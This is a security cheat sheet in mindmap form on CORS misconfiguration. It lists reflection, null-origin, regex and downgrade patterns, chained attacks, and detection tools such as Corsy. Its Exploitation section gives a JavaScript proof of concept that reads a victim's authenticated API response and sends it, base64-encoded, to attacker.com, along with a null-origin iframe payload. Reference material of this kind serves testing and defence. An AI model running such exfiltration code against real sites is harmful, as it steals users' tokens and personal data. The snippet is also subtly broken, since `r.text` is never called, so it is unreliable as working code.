# CORS Misconfiguration — Mindmap

## Root Cause
Server reflects `Origin` into `Access-Control-Allow-Origin` and also sends
`Access-Control-Allow-Credentials: true`, letting any site read authenticated
responses.

## Misconfiguration Patterns
- **Origin reflection**: `ACAO: <request Origin>` with credentials true
- **Null origin**: `ACAO: null` — triggerable from sandboxed iframe / `data:` URL
- **Wildcard + credentials**: `ACAO: *` + `ACAC: true` (browser rejects, but some proxies/middleware differ)
- **Weak suffix/prefix match**: `*.target.com` matched with `target.com.attacker.com`
- **Unescaped regex**: `target.com` regex matches `attackertarget.com`
- **Subdomain trust**: any XSS on a subdomain becomes full account takeover
- **HTTP downgrade**: trusts `http://` origin for an `https://` app
- **Pre-flight bypass**: `OPTIONS` returns permissive headers without validation

## Exploitation
```html
<script>
fetch('https://victim.com/api/me', {credentials:'include'})
  .then(r=>r.text).then(d=>fetch('https://attacker.com/?d='+btoa(d)));
</script>
```
- Null origin PoC: `<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch(...)</script>">`
- Read: API keys, CSRF tokens, PII, internal endpoints, admin data

## Chained Attacks
- CORS + XSS on subdomain → ATO
- CORS + cache poisoning → mass data theft
- CORS + SSRF → internal API access

## Detection
- Send `Origin: https://evil.com` and inspect `ACAO` / `ACAC` response headers
- Tools: Corsy, Burp CORS extension, nuclei `cors-misconfig` templates
